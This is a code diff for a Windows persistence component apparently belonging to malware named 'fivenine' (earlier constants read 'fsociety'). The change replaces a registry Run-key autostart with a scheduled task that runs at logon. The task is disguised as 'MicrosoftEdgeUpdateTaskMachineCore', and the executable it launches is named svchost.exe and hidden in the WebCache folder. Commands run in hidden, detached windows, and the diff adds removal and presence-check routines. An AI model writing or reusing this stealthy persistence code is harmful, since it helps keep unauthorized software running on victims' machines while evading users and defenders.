@@ -1,33 +1,79 @@
 #include <windows.h>
+#include <stdio.h>
+#include <string.h>
 #include "fivenine.h"
 
-#define RUN_KEY "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-#define VALUE_NAME "fsociety"
-#define MUTEX_NAME "Global\\fsociety_fivenine"
+#define TASK_NAME "MicrosoftEdgeUpdateTaskMachineCore"
+
+void RunSilentCommand(const char *command) {
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    ZeroMemory(&pi, sizeof(pi));
+
+    CreateProcessA(NULL, (LPSTR)command, NULL, NULL, FALSE,
+                   CREATE_NO_WINDOW | DETACHED_PROCESS,
+                   NULL, NULL, &si, &pi);
+
+    if (pi.hProcess) CloseHandle(pi.hProcess);
+    if (pi.hThread) CloseHandle(pi.hThread);
+}
 
 int fivenine_install(void)
 {
-    char exe_path[MAX_PATH];
-    if (GetModuleFileNameA(NULL, exe_path, MAX_PATH) == 0)
-        return -1;
+    char localappdata[MAX_PATH];
+    GetEnvironmentVariableA("LOCALAPPDATA", localappdata, MAX_PATH);
 
-    HKEY hkey;
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_SET_VALUE, &hkey) != ERROR_SUCCESS)
-        return -1;
+    char hidden_exe[MAX_PATH];
+    snprintf(hidden_exe, MAX_PATH, "%s\\Microsoft\\Windows\\WebCache\\svchost.exe", localappdata);
 
-    LONG rc = RegSetValueExA(hkey, VALUE_NAME, 0, REG_SZ,
-                             (const BYTE *)exe_path,
-                             (DWORD)(strlen(exe_path) + 1));
-    RegCloseKey(hkey);
-    return (rc == ERROR_SUCCESS) ? 0 : -1;
+    char cmd[1024];
+    // On utilise 'cmd /c' pour être sûr que la commande passe
+    snprintf(cmd, sizeof(cmd),
+             "cmd.exe /c schtasks /create /tn \"MicrosoftEdgeUpdateTaskMachineCore\" /tr \"\\\"%s\\\"\" /sc onlogon /f",
+             hidden_exe);
+
+    STARTUPINFOA si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
+                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        return -1;
+                   }
+
+    WaitForSingleObject(pi.hProcess, 5000);
+    DWORD exit_code = 0;
+    GetExitCodeProcess(pi.hProcess, &exit_code);
+
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    return (int)exit_code;
 }
 
 int fivenine_uninstall(void)
 {
-    HKEY hkey;
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_SET_VALUE, &hkey) != ERROR_SUCCESS)
-        return -1;
-    LONG rc = RegDeleteValueA(hkey, VALUE_NAME);
-    RegCloseKey(hkey);
-    return (rc == ERROR_SUCCESS) ? 0 : -1;
+    char cmd[512];
+    snprintf(cmd, sizeof(cmd), "schtasks /delete /tn \"%s\" /f", TASK_NAME);
+
+    RunSilentCommand(cmd);
+    return 0;
+}
+
+int fivenine_is_installed(void)
+{
+    char cmd[512];
+    snprintf(cmd, sizeof(cmd), "schtasks /query /tn \"%s\"", TASK_NAME);
+
+    char full_cmd[1024];
+    snprintf(full_cmd, sizeof(full_cmd), "%s > nul 2>&1", cmd);
+
+    int rc = system(full_cmd);
+    return (rc == 0) ? 1 : 0;
 }
